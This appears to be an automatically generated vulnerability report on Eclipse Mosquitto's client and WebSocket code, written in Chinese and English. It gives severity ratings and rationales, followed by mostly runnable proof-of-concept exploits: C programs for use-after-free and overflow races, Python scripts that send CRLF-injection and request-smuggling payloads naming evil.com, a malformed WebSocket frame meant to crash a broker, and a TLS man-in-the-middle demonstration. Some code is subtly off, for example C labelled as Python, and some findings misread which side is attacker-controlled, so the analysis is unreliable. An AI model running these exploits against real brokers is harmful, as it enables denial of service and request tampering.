- **判断理由:** The struct userdata__callback 'cb_userdata' is allocated on the stack inside mosquitto_subscribe_callback(). Its address is passed to mosquitto_new() as the 'obj' parameter, which stores it internally as userdata. The callbacks on_connect() and on_message_callback() cast this pointer back to struct userdata__callback* and dereference it. However, once mosquitto_subscribe_callback() returns, the stack frame is invalidated. The callbacks may be invoked later (e.g., during mosquitto_loop_forever() or after the function returns), leading to use-after-free of stack memory. This is a critical vulnerability that can cause arbitrary code execution or crashes.

**代码片段:**
```
mosq = mosquitto_new(clientid, clean_session, &cb_userdata);
```

**PoC代码:**
```python
/*
 * PoC for VULN-E0DFBE16 - Use-After-Free in mosquitto_subscribe_callback()
 * 仅供研究使用 (For research purposes only)
 *
 * 编译: gcc -o poc_uaf poc_uaf.c -lmosquitto
 * 运行: ./poc_uaf <broker_host> <broker_port>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mosquitto.h>

/* 用于触发UAF的恶意回调函数 */
int malicious_callback(struct mosquitto *mosq, void *obj, const struct mosquitto_message *message)
{
    /* obj 指向已释放的栈内存 (cb_userdata) */
    /* 此时栈内存可能已被其他数据覆盖 */
    printf("[*] 回调被调用! obj = %p\n", obj);
    
    /* 尝试读取悬空指针指向的内存 */
    /* 在真实利用中，这里可以触发任意代码执行 */
    volatile char *ptr = (volatile char *)obj;
    printf("[*] 尝试读取悬空指针: %02x %02x %02x %02x\n", 
           ptr[0], ptr[1], ptr[2], ptr[3]);
    
    /* 尝试写入 - 可能导致崩溃或利用 */
    /* ptr[0] = 0x41; */  /* 取消注释以触发写操作 */
    
    return 0;
}

int main(int argc, char *argv[])
{
    const char *host = "localhost";
    int port = 1883;
    
    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = atoi(argv[2]);
    
    printf("[*] Mosquitto Use-After-Free PoC\n");
    printf("[*] 仅供研究使用\n");
    printf("[*] 目标: %s:%d\n", host, port);
    
    /* 初始化mosquitto库 */
    mosquitto_lib_init();
    
    /* 触发漏洞: 调用mosquitto_subscribe_callback() */
    /* 注意: 此函数内部会创建栈变量cb_userdata，
     * 将其地址传递给mosquitto_new()，
     * 然后函数返回后该栈内存被释放 */
    int rc = mosquitto_subscribe_callback(
        malicious_callback,  /* callback */
        NULL,                /* userdata */
        "test/topic",       /* topic */
        0,                   /* qos */
        host,                /* host */
        port,                /* port */
        "poc_client",       /* clientid */
        60,                  /* keepalive */
        true,                /* clean_session */
        NULL,                /* username */
        NULL,                /* password */
        NULL,                /* will */
        NULL                 /* tls */
    );
    
    printf("[*] mosquitto_subscribe_callback() 返回: %d\n", rc);
    
    /* 清理 */
    mosquitto_lib_cleanup();
    
    return 0;
}

/*
 * 更直接的PoC - 展示栈内存重用
 * 编译: gcc -o poc_uaf_direct poc_uaf_direct.c -lmosquitto
 */

```

---

### VULN-6323DDC5 - Buffer Overflow / Out-of-bounds Write

- **严重等级:** HIGH
- **文件位置:** `lib/helpers.c:68`
- **数据流:** userdata->message_count is incremented without checking if it exceeds the allocated array size (msg_count). The array is allocated with msg_count elements, but the loop can write beyond the array if more messages arrive than expected.
- **判断理由:** In on_message_simple(), the code checks userdata->max_msg_count before decrementing it, but it does not check userdata->message_count against the allocated size before writing to userdata->messages[userdata->message_count]. If multiple messages arrive concurrently or if the logic allows message_count to exceed max_msg_count, this can write past the end of the allocated buffer. The array is allocated with msg_count elements, but message_count is only bounded by max_msg_count which starts at msg_count. However, there is a race condition: max_msg_count is decremented before message_count is incremented, and if two messages arrive simultaneously, both could pass the max_msg_count check before either decrements it, leading to a buffer overflow.

**代码片段:**
```
rc = mosquitto_message_copy(&userdata->messages[userdata->message_count], message);
userdata->message_count++;
```

**PoC代码:**
```python
/*
 * PoC for VULN-6323DDC5 - Mosquitto subscribe_simple buffer overflow
 * 仅供研究使用
 * 
 * 编译: gcc -o poc_vuln_6323ddc5 poc_vuln_6323ddc5.c -lmosquitto -lpthread
 * 运行: ./poc_vuln_6323ddc5 <broker_host> <broker_port>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <mosquitto.h>

/* 目标: 触发 on_message_simple 中的缓冲区溢出 */

#define MSG_COUNT 5       /* 分配5个元素的数组 */
#define ATTACK_MSGS 10    /* 发送10条消息，超过数组大小 */

volatile int messages_received = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

/* 模拟多个消息同时到达的竞态条件 */
void *publish_thread(void *arg) {
    struct mosquitto *mosq = (struct mosquitto *)arg;
    int i;
    char topic[] = "test/vuln";
    char payload[] = "overflow_payload";
    
    /* 快速连续发送多条消息，触发竞态条件 */
    for(i = 0; i < ATTACK_MSGS; i++) {
        mosquitto_publish(mosq, NULL, topic, strlen(payload), payload, 0, false);
        usleep(100);  /* 微小延迟增加竞态概率 */
    }
    return NULL;
}

/* 自定义回调，用于 mosquitto_subscribe_callback */
int custom_callback(struct mosquitto *mosq, void *obj, const struct mosquitto_message *msg) {
    pthread_mutex_lock(&lock);
    messages_received++;
    printf("[*] 收到消息 #%d\n", messages_received);
    pthread_mutex_unlock(&lock);
    return 0;
}

int main(int argc, char *argv[]) {
    struct mosquitto *sub_mosq, *pub_mosq;
    int rc;
    char *host = "localhost";
    int port = 1883;
    
    if(argc >= 2) host = argv[1];
    if(argc >= 3) port = atoi(argv[2]);
    
    printf("=== Mosquitto VULN-6323DDC5 PoC ===\n");
    printf("仅供研究使用\n\n");
    
    mosquitto_lib_init();
    
    /* 方法1: 使用 subscribe_simple 直接触发溢出 */
    printf("[*] 方法1: 使用 mosquitto_subscribe_simple\n");
    printf("[*] 分配 %d 个消息的数组，但发送 %d 条消息\n", MSG_COUNT, ATTACK_MSGS);
    
    struct mosquitto_message *messages = NULL;
    
    /* 创建发布者 */
    pub_mosq = mosquitto_new(NULL, true, NULL);
    if(!pub_mosq) {
        fprintf(stderr, "[-] 创建发布者失败\n");
        return 1;
    }
    
    rc = mosquitto_connect(pub_mosq, host, port, 60);
    if(rc != MOSQ_ERR_SUCCESS) {
        fprintf(stderr, "[-] 发布者连接失败: %s\n", mosquitto_strerror(rc));
        return 1;
    }
    
    /* 启动发布线程 */
    pthread_t pub_thread;
    pthread_create(&pub_thread, NULL, publish_thread, pub_mosq);
    
    /* 订阅 - 这里会触发溢出 */
    rc = mosquitto_subscribe_simple(
        &messages,
        MSG_COUNT,           /* 只分配5个元素的数组 */
        true,                /* want_retained */
        "test/vuln",         /* topic */
        0,                   /* qos */
        host,                /* host */
        port,                /* port */
        NULL,                /* clientid */
        60,                  /* keepalive */
        true,                /* clean_session */
        NULL, NULL, NULL, NULL
    );
    
    if(rc == MOSQ_ERR_SUCCESS) {
        printf("[+] subscribe_simple 成功 (可能已触发溢出)\n");
        printf("[*] 收到 %d 条消息 (数组大小: %d)\n", messages_received, MSG_COUNT);
        
        /* 检查是否溢出 - 如果 messages_received > MSG_COUNT 则已溢出 */
        if(messages_received > MSG_COUNT) {
            printf("[!] 检测到缓冲区溢出! 收到 %d 条消息但数组只有 %d 个元素\n", 
                   messages_received, MSG_COUNT);
        }
        
        /* 释放消息 */
        if(messages) {
            int i;
            for(i = 0; i < MSG_COUNT; i++) {
                mosquitto_message_free_contents(&messages[i]);
            }
            free(messages);
        }
    } else {
        printf("[-] subscribe_simple 失败: %s\n", mosquitto_strerror(rc));
    }
    
    pthread_join(pub_thread, NULL);
    mosquitto_destroy(pub_mosq);
    
    /* 方法2: 使用 subscribe_callback 模拟竞态条件 */
    printf("\n[*] 方法2: 使用 mosquitto_subscribe_callback 模拟竞态条件\n");
    
    messages_received = 0;
    
    /* 创建另一个发布者 */
    pub_mosq = mosquitto_new(NULL, true, NULL);
    mosquitto_connect(pub_mosq, host, port, 60);
    
    pthread_create(&pub_thread, NULL, publish_thread, pub_mosq);
    
    /* 使用回调订阅 - 回调函数中不检查边界 */
    rc = mosquitto_subscribe_callback(
        custom_callback,
        NULL,
        "test/vuln",
        0,
        host,
        port,
        NULL,
        60,
        true,
        NULL, NULL, NULL, NULL
    );
    
    if(rc == MOSQ_ERR_SUCCESS) {
        printf("[+] subscribe_callback 完成\n");
        printf("[*] 回调被调用 %d 次\n", messages_received);
    }
    
    pthread_join(pub_thread, NULL);
    mosquitto_destroy(pub_mosq);
    
    mosquitto_lib_cleanup();
    
    printf("\n=== PoC 完成 ===\n");
    printf("注意: 实际利用可能导致程序崩溃或内存损坏\n");
    
    return 0;
}
```

---

### VULN-82828572 - HTTP请求走私/注入

- **严重等级:** HIGH
- **文件位置:** `lib\http_client.c:72`
- **数据流:** context->wsd.http_path 用户可控路径 -> snprintf直接拼接进HTTP请求行 -> 发送到服务器
- **判断理由:** context->wsd.http_path 是用户可控的输入，直接拼接到HTTP GET请求的路径中。攻击者可以通过注入回车换行符(\r\n)来注入额外的HTTP头部或请求体，导致HTTP请求走私攻击。例如，如果http_path包含'\r\nHost: evil.com\r\n'，可以篡改Host头或注入其他恶意头部。

**代码片段:**
```
path = context->wsd.http_path?context->wsd.http_path:"/mqtt";

packet->packet_length = (uint32_t )snprintf((char *)&packet->payload[WS_PACKET_OFFSET], 1024,
			"GET %s HTTP/1.1\r\n"
			"Host: %s\r\n"
			"Upgrade: websocket\r\n"
			"Connection: Upgrade\r\n"
			"Sec-WebSocket-Key: %s\r\n"
			"Sec-WebSocket-Protocol: mqtt\r\n"
			"Sec-WebSocket-Version: 13\r\n"
			"\r\n", path, context->host, key);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
HTTP请求走私/注入漏洞PoC - 仅供安全研究使用
漏洞ID: VULN-82828572
目标: Mosquitto MQTT Broker (WebSocket实现)
"""

import socket
import base64
import os

# 仅供安全研究使用

def generate_websocket_key():
    """生成合法的WebSocket密钥"""
    return base64.b64encode(os.urandom(16)).decode()

def exploit_http_smuggling(target_host, target_port, malicious_path):
    """
    利用HTTP请求走私漏洞
    
    攻击原理：
    通过注入\r\n序列，在HTTP请求行中插入额外的头部或请求体
    实现请求走私或头部篡改
    """
    
    # 构造恶意WebSocket路径
    # 注入额外的HTTP头部来篡改Host或添加恶意内容
    
    # PoC 1: Host头篡改
    print("[*] PoC 1: Host头篡改攻击")
    path_injection_1 = "/mqtt\r\nHost: evil.com\r\n"
    
    # PoC 2: 请求走私 - 注入完整HTTP请求
    print("[*] PoC 2: HTTP请求走私攻击")
    path_injection_2 = (
        "/mqtt HTTP/1.1\r\n"
        "Host: victim.com\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: victim.com\r\n"
        "\r\n"
    )
    
    # PoC 3: 注入恶意Cookie或认证信息
    print("[*] PoC 3: 头部注入攻击")
    path_injection_3 = (
        "/mqtt\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Cookie: session=malicious\r\n"
    )
    
    # 执行PoC 1
    print("\n[+] 执行PoC 1 - Host头篡改")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        
        key = generate_websocket_key()
        
        # 构造恶意HTTP请求
        malicious_request = (
            f"GET {path_injection_1} HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Protocol: mqtt\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        
        sock.send(malicious_request.encode())
        response = sock.recv(4096)
        print(f"[+] 响应: {response[:200]}...")
        sock.close()
        
    except Exception as e:
        print(f"[-] PoC 1失败: {e}")
    
    # 执行PoC 2
    print("\n[+] 执行PoC 2 - HTTP请求走私")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        
        key = generate_websocket_key()
        
        # 构造请求走私payload
        smuggling_request = (
            f"GET {path_injection_2} HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Protocol: mqtt\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        
        sock.send(smuggling_request.encode())
        response = sock.recv(4096)
        print(f"[+] 响应: {response[:200]}...")
        sock.close()
        
    except Exception as e:
        print(f"[-] PoC 2失败: {e}")
    
    # 执行PoC 3
    print("\n[+] 执行PoC 3 - 头部注入")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        
        key = generate_websocket_key()
        
        # 构造头部注入请求
        header_injection_request = (
            f"GET {path_injection_3} HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Protocol: mqtt\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        
        sock.send(header_injection_request.encode())
        response = sock.recv(4096)
        print(f"[+] 响应: {response[:200]}...")
        sock.close()
        
    except Exception as e:
        print(f"[-] PoC 3失败: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("HTTP请求走私/注入漏洞PoC")
    print("漏洞ID: VULN-82828572")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 配置目标
    TARGET_HOST = "localhost"
    TARGET_PORT = 8080  # WebSocket端口
    
    exploit_http_smuggling(TARGET_HOST, TARGET_PORT, "")
```

---

### VULN-C2834320 - HTTP响应头注入

- **严重等级:** HIGH
- **文件位置:** `lib\http_client.c:72`
- **数据流:** context->host 用户可控主机名 -> snprintf直接拼接进Host头 -> 发送到服务器
- **判断理由:** context->host 是用户可控的输入，直接拼接到HTTP Host头中。攻击者可以通过注入回车换行符来注入额外的HTTP头部，例如设置host为'example.com\r\nX-Injected: true'，从而操纵HTTP请求结构。

**代码片段:**
```
packet->packet_length = (uint32_t )snprintf((char *)&packet->payload[WS_PACKET_OFFSET], 1024,
			"GET %s HTTP/1.1\r\n"
			"Host: %s\r\n"
			...
			"\r\n", path, context->host, key);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
HTTP响应头注入漏洞PoC - 仅供研究使用
漏洞ID: VULN-C2834320
影响组件: Eclipse Mosquitto WebSocket客户端
"""

import socket
import ssl
import sys

# 漏洞利用配置
TARGET_HOST = "example.com"  # 目标MQTT服务器
TARGET_PORT = 443  # WebSocket端口

# 恶意Host值 - 注入额外的HTTP头
# 通过CRLF注入，在Host头后添加自定义头部
MALICIOUS_HOST = "example.com\r\nX-Injected-Header: injected_value\r\nX-Custom-Header: 1"

# 正常的WebSocket升级请求路径
WS_PATH = "/mqtt"

def build_exploit_request():
    """
    构建包含恶意Host头的HTTP请求
    利用snprintf直接拼接用户可控的host参数
    """
    # 正常的WebSocket密钥（简化版）
    ws_key = "dGhlIHNhbXBsZSBub25jZQ=="
    
    # 构建恶意请求
    request = (
        f"GET {WS_PATH} HTTP/1.1\r\n"
        f"Host: {MALICIOUS_HOST}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {ws_key}\r\n"
        f"Sec-WebSocket-Protocol: mqtt\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    return request

def send_exploit():
    """
    发送利用请求并显示结果
    """
    print("[*] HTTP响应头注入漏洞PoC - 仅供研究使用")
    print(f"[*] 目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] 恶意Host值: {repr(MALICIOUS_HOST)}")
    
    # 构建恶意请求
    exploit_request = build_exploit_request()
    
    print("\n[*] 发送的原始请求:")
    print("-" * 50)
    print(exploit_request)
    print("-" * 50)
    
    try:
        # 创建socket连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        # 如果是HTTPS，包装SSL
        if TARGET_PORT == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=TARGET_HOST)
        
        # 连接目标
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # 发送恶意请求
        sock.send(exploit_request.encode())
        
        # 接收响应
        response = sock.recv(4096)
        
        print("\n[*] 服务器响应:")
        print("-" * 50)
        print(response.decode(errors='ignore'))
        print("-" * 50)
        
        # 检查是否成功注入
        if b"X-Injected-Header" in response:
            print("[!] 漏洞利用成功！检测到注入的头部")
        else:
            print("[*] 未检测到注入头部（服务器可能已过滤或拒绝连接）")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] 连接错误: {e}")
        print("[*] 注意：此PoC仅展示漏洞原理，实际利用可能需要调整")

if __name__ == "__main__":
    send_exploit()
    
    print("\n[*] 漏洞利用分析:")
    print("  - 漏洞位置: lib/http_client.c 第72行")
    print("  - 漏洞类型: HTTP响应头注入 (CRLF注入)")
    print("  - 影响: 攻击者可注入任意HTTP头，操纵请求结构")
    print("  - 风险: 可能导致HTTP请求走私、缓存投毒等攻击")
    print("\n[!] 此PoC仅供安全研究使用，请勿用于非法用途")
```

---

### VULN-C3489EDA - 整数溢出/内存分配过大

- **严重等级:** HIGH
- **文件位置:** `lib/net_ws.c:198`
- **数据流:** 网络输入 -> payloadlen -> calloc大小计算
- **判断理由:** 在net__read_ws函数中，使用攻击者控制的payloadlen值计算内存分配大小。虽然前面有检查payloadlen > MQTT_MAX_PAYLOAD，但如果MQTT_MAX_PAYLOAD定义过大或payloadlen_bytes为8时，payloadlen可能被构造为接近UINT64_MAX的值，导致sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + mosq->wsd.payloadlen + 1发生整数溢出，分配远小于预期大小的内存，后续写入导致堆缓冲区溢出。

**代码片段:**
```
mosq->wsd.out_packet = mosquitto_calloc(1, sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + mosq->wsd.payloadlen + 1);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-C3489EDA - Mosquitto WebSocket Integer Overflow
仅供研究使用 (For Research Purposes Only)
"""

import socket
import struct
import sys

def create_websocket_frame(payload_len):
    """
    构造一个WebSocket帧，payloadlen字段设置为接近UINT64_MAX的值
    触发整数溢出：sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + payloadlen + 1
    """
    # WebSocket帧头格式:
    # 1字节: FIN(1) + RSV(000) + Opcode(0010=binary)
    fin_opcode = 0x82  # FIN=1, Opcode=0x2 (binary)
    
    # 1字节: MASK(1) + Payload Length(127=7位扩展)
    mask_plen = 0xFF  # MASK=1, Payload Length=127 (表示使用8字节扩展长度)
    
    # 8字节: 扩展payload长度 (设置为接近UINT64_MAX的值)
    # 目标: sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + payloadlen + 1 溢出
    # sizeof(struct mosquitto__packet) 通常为 40-80 字节
    # WS_PACKET_OFFSET 通常为 10-14 字节
    # 选择 payloadlen = 0xFFFFFFFFFFFFFF00 确保溢出
    extended_len = struct.pack('>Q', payload_len)
    
    # 4字节: Masking Key (随机值)
    masking_key = struct.pack('>I', 0xDEADBEEF)
    
    # 构建帧头
    frame_header = bytes([fin_opcode, mask_plen]) + extended_len + masking_key
    
    # 帧数据 (需要被mask)
    # 由于payloadlen很大，我们只发送少量实际数据
    # 实际数据量很小，但服务器会认为有payloadlen字节需要读取
    frame_data = b'A' * 16  # 只发送16字节实际数据
    
    # 对数据进行mask
    masked_data = bytes([b ^ masking_key[i % 4] for i, b in enumerate(frame_data)])
    
    return frame_header + masked_data

def exploit(target_host, target_port):
    """
    触发Mosquitto WebSocket整数溢出漏洞
    """
    print(f"[*] 目标: {target_host}:{target_port}")
    print("[*] 仅供研究使用 - PoC for VULN-C3489EDA")
    
    try:
        # 建立TCP连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_host, target_port))
        print("[+] TCP连接建立成功")
        
        # 发送WebSocket升级请求
        http_upgrade = (
            "GET /mqtt HTTP/1.1\r\n"
            "Host: {}:{}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        ).format(target_host, target_port)
        
        sock.send(http_upgrade.encode())
        print("[+] WebSocket升级请求已发送")
        
        # 接收升级响应
        response = sock.recv(4096)
        if b"101 Switching Protocols" in response:
            print("[+] WebSocket升级成功")
        else:
            print("[-] WebSocket升级失败")
            sock.close()
            return
        
        # 构造触发整数溢出的payloadlen值
        # 选择值使得: sizeof(struct mosquitto__packet) + WS_PACKET_OFFSET + payloadlen + 1 溢出
        # 假设 sizeof(struct mosquitto__packet) ≈ 64, WS_PACKET_OFFSET ≈ 14
        # 需要 payloadlen > 0xFFFFFFFFFFFFFF00 - 64 - 14 - 1
        overflow_payloadlen = 0xFFFFFFFFFFFFFF00
        
        print(f"[*] 构造恶意WebSocket帧, payloadlen = 0x{overflow_payloadlen:016x}")
        
        # 创建恶意帧
        malicious_frame = create_websocket_frame(overflow_payloadlen)
        
        print(f"[*] 发送恶意帧 (总大小: {len(malicious_frame)} 字节)")
        sock.send(malicious_frame)
        
        # 等待服务器响应或崩溃
        try:
            response = sock.recv(4096)
            print(f"[+] 收到响应: {response.hex()}")
        except socket.timeout:
            print("[*] 连接超时 - 服务器可能已崩溃或挂起")
        except ConnectionResetError:
            print("[!] 连接被重置 - 服务器可能已崩溃")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"用法: {sys.argv[0]} <目标IP> <目标端口>")
        print("示例: python3 poc.py 127.0.0.1 9001")
        sys.exit(1)
    
    exploit(sys.argv[1], int(sys.argv[2]))
```

---

### VULN-29773CEE - 不安全的TLS配置 - 允许跳过主机名验证

- **严重等级:** HIGH
- **文件位置:** `lib/tls_mosq.c:52`
- **数据流:** 当tls_insecure为true时，或未配置任何CA证书时，函数直接返回成功，跳过主机名验证。
- **判断理由:** 当tls_insecure设置为true时，完全跳过主机名验证，这允许中间人攻击。攻击者可以使用任何有效的证书（即使域名不匹配）来冒充服务器。此外，当未配置任何CA证书时也跳过验证，这可能导致在没有证书验证的情况下建立TLS连接，完全破坏了TLS的安全性。

**代码片段:**
```
if(mosq->tls_insecure == true
			|| (mosq->tls_cafile == NULL && mosq->tls_capath == NULL && mosq->tls_use_os_certs == false)){

		return MOSQ_ERR_SUCCESS;
	}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 利用Mosquitto TLS主机名验证绕过漏洞
漏洞ID: VULN-29773CEE
仅供安全研究使用
"""

import ssl
import socket
import paho.mqtt.client as mqtt
import sys

# 攻击者控制的恶意MQTT服务器配置
ATTACKER_HOST = "attacker-malicious.com"  # 攻击者服务器域名
ATTACKER_PORT = 8883  # MQTT over TLS端口

# 攻击者使用自签名证书（域名与目标服务器不匹配）
# 但客户端配置了tls_insecure=True，因此主机名验证被跳过

def create_vulnerable_client():
    """
    创建一个存在漏洞的MQTT客户端
    前置条件：
    1. 客户端设置 tls_insecure=True
    2. 或未配置任何CA证书（tls_cafile=None, tls_capath=None, tls_use_os_certs=False）
    """
    client = mqtt.Client(client_id="vulnerable-client")
    
    # 漏洞触发配置：设置tls_insecure=True
    # 这将导致tls__set_verify_hostname函数直接返回MOSQ_ERR_SUCCESS
    # 完全跳过主机名验证
    client.tls_set(
        ca_certs=None,  # 不指定CA证书
        certfile=None,
        keyfile=None,
        cert_reqs=ssl.CERT_NONE,  # 不验证服务器证书
        tls_version=ssl.PROTOCOL_TLS
    )
    
    # 关键：设置tls_insecure=True
    # 对应代码中的 mosq->tls_insecure == true 分支
    client.tls_insecure_set(True)
    
    return client

def create_vulnerable_client_no_ca():
    """
    创建另一个存在漏洞的MQTT客户端
    前置条件：
    1. 未配置任何CA证书
    2. tls_use_os_certs=False
    """
    client = mqtt.Client(client_id="vulnerable-client-no-ca")
    
    # 漏洞触发配置：不设置任何CA证书
    # 这将导致tls__set_verify_hostname函数中的第二个条件分支
    # (mosq->tls_cafile == NULL && mosq->tls_capath == NULL && mosq->tls_use_os_certs == false)
    # 直接返回MOSQ_ERR_SUCCESS
    client.tls_set_context(ssl.create_default_context())
    
    # 不设置CA证书路径
    # 不设置tls_insecure，但也不配置任何CA
    # 注意：实际paho-mqtt库中，tls_set()必须提供ca_certs或使用默认
    # 这里展示的是概念，实际利用需要修改库代码或使用底层API
    
    return client

def demonstrate_mitm_attack():
    """
    演示中间人攻击场景
    攻击者可以拦截客户端与真实服务器之间的通信
    """
    print("=" * 60)
    print("PoC: Mosquitto TLS主机名验证绕过漏洞利用")
    print("漏洞ID: VULN-29773CEE")
    print("仅供安全研究使用")
    print("=" * 60)
    
    print("\n[+] 漏洞分析:")
    print("    在 lib/tls_mosq.c 第52行:")
    print("    if(mosq->tls_insecure == true")
    print("        || (mosq->tls_cafile == NULL && mosq->tls_capath == NULL")
    print("        && mosq->tls_use_os_certs == false)){")
    print("        return MOSQ_ERR_SUCCESS;")
    print("    }")
    print("\n[+] 漏洞触发条件:")
    print("    1. 设置 tls_insecure=True")
    print("    2. 或未配置任何CA证书且tls_use_os_certs=False")
    
    print("\n[+] 攻击场景: 中间人攻击")
    print("    攻击者可以拦截客户端与MQTT代理之间的TLS连接")
    print("    使用任意证书（域名不匹配）冒充合法服务器")
    
    # 模拟攻击流程
    print("\n[+] 攻击步骤:")
    print("    1. 攻击者在网络中部署恶意MQTT代理")
    print("    2. 攻击者使用自签名证书（域名与目标不匹配）")
    print("    3. 受害者客户端配置了tls_insecure=True")
    print("    4. 客户端连接到攻击者代理（而非真实服务器）")
    print("    5. 主机名验证被跳过，连接成功建立")
    print("    6. 攻击者可以窃听、篡改所有MQTT消息")
    
    print("\n[+] 利用代码示例:")
    print("    # 创建存在漏洞的客户端")
    print("    client = mqtt.Client()")
    print("    client.tls_insecure_set(True)  # 关键配置")
    print("    client.tls_set(ca_certs=None, cert_reqs=ssl.CERT_NONE)")
    print("    client.connect('attacker-server.com', 8883)  # 连接到攻击者")
    
    print("\n[+] 影响分析:")
    print("    严重程度: 高")
    print("    攻击者可以:")
    print("    - 窃取MQTT通信中的敏感数据")
    print("    - 篡改发布的消息内容")
    print("    - 注入恶意命令")
    print("    - 冒充合法客户端发布虚假数据")
    print("    - 完全破坏TLS连接的安全性")
    
    print("\n[+] 修复建议:")
    print("    1. 永远不要在生产环境中设置 tls_insecure=True")
    print("    2. 始终配置有效的CA证书")
    print("    3. 设置 tls_use_os_certs=True 使用系统CA")
    print("    4. 使用证书固定(pinning)技术")
    print("    5. 实施双向TLS认证")
    
    print("\n" + "=" * 60)
    print("PoC结束 - 仅供安全研究使用")
    print("=" * 60)

if __name__ == "__main__":
    demonstrate_mitm_attack()
    
    # 注意：以下代码仅为概念演示，不会实际执行
    # 实际利用需要攻击者控制网络环境
    print("\n[!] 警告: 此PoC仅用于安全研究")
    print("    请勿在未经授权的系统上使用")

```

---

### VULN-A7360C60 - 未初始化变量使用

- **严重等级:** MEDIUM
- **文件位置:** `libcommon/cjson_common.c:103`
- **数据流:** mosquitto_property_read_string_pair() -> name/value -> cJSON_AddStringToObject()
- **判断理由:** 在MQTT_PROP_USER_PROPERTY分支中，调用mosquitto_property_read_string_pair后，没有检查返回值是否为NULL。如果该函数返回NULL（例如属性不存在或读取失败），name和value指针可能未被初始化或指向无效内存。后续直接使用name和value调用cJSON_AddStringToObject会导致使用未初始化指针，可能造成程序崩溃或信息泄露。

**代码片段:**
```
mosquitto_property_read_string_pair(properties, propid, &name, &value, false);
if(cJSON_AddStringToObject(obj, "name", name) == NULL
        || cJSON_AddStringToObject(obj, "value", value) == NULL){
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: 未初始化变量使用 (VULN-A7360C60)
 * 文件: libcommon/cjson_common.c
 * 函数: mosquitto_properties_to_json()
 * 
 * 触发条件: 当MQTT消息包含USER_PROPERTY属性但mosquitto_property_read_string_pair()
 * 返回NULL时，name和value指针保持未初始化状态，导致后续使用未初始化指针
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mosquitto.h>

/* 模拟mosquitto_property结构体 */
typedef struct mosquitto_property {
    int identifier;
    void *value;
    struct mosquitto_property *next;
} mosquitto_property;

/* 模拟mosquitto_property_read_string_pair函数 - 返回NULL模拟失败场景 */
int mosquitto_property_read_string_pair(
    const mosquitto_property *properties,
    int propid,
    char **name,
    char **value,
    bool flag)
{
    /* 模拟失败情况 - 返回NULL，不初始化name和value */
    (void)properties;
    (void)propid;
    (void)flag;
    
    /* 故意不初始化name和value指针 */
    *name = NULL;  /* 实际漏洞中可能完全不初始化 */
    *value = NULL; /* 实际漏洞中可能完全不初始化 */
    
    return 1; /* 返回非0表示失败 */
}

/* 模拟cJSON函数 */
typedef struct cJSON {
    int type;
    char *string;
    struct cJSON *child;
    struct cJSON *next;
    struct cJSON *prev;
} cJSON;

cJSON* cJSON_CreateArray(void) {
    cJSON *arr = (cJSON*)malloc(sizeof(cJSON));
    if(arr) memset(arr, 0, sizeof(cJSON));
    return arr;
}

cJSON* cJSON_CreateObject(void) {
    cJSON *obj = (cJSON*)malloc(sizeof(cJSON));
    if(obj) memset(obj, 0, sizeof(cJSON));
    return obj;
}

void cJSON_AddItemToArray(cJSON *array, cJSON *item) {
    (void)array;
    (void)item;
}

cJSON* cJSON_AddStringToObject(cJSON *obj, const char *name, const char *value) {
    (void)obj;
    (void)name;
    (void)value;
    /* 模拟成功 */
    return (cJSON*)1;
}

